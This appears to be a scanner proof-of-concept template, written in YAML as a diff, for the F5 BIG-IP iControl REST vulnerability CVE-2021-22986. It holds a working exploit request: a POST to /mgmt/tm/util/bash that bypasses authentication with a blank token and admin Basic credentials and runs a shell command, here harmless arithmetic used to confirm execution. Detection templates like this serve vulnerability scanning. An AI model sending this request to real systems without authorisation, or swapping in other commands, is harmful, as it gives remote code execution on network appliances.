@@ -1,0 +1,25 @@
+detail:
+  author: Hex
+  links:
+  - https://support.f5.com/csp/article/K03009991
+expression: r0()
+manual: true
+name: poc-yaml-f5-cve-2021-22986
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(bytes(string(r1
+      + r2)))
+    request:
+      body: '{"command":"run","utilCmdArgs":"-c ''expr {{r1}} + {{r2}}''"}'
+      cache: true
+      follow_redirects: false
+      headers:
+        Authorization: Basic YWRtaW46
+        Content-Type: application/json
+        X-F5-Auth-Token: ' '
+      method: POST
+      path: /mgmt/tm/util/bash
+set:
+  r1: randomInt(800000000, 1000000000)
+  r2: randomInt(800000000, 1000000000)
+transport: http
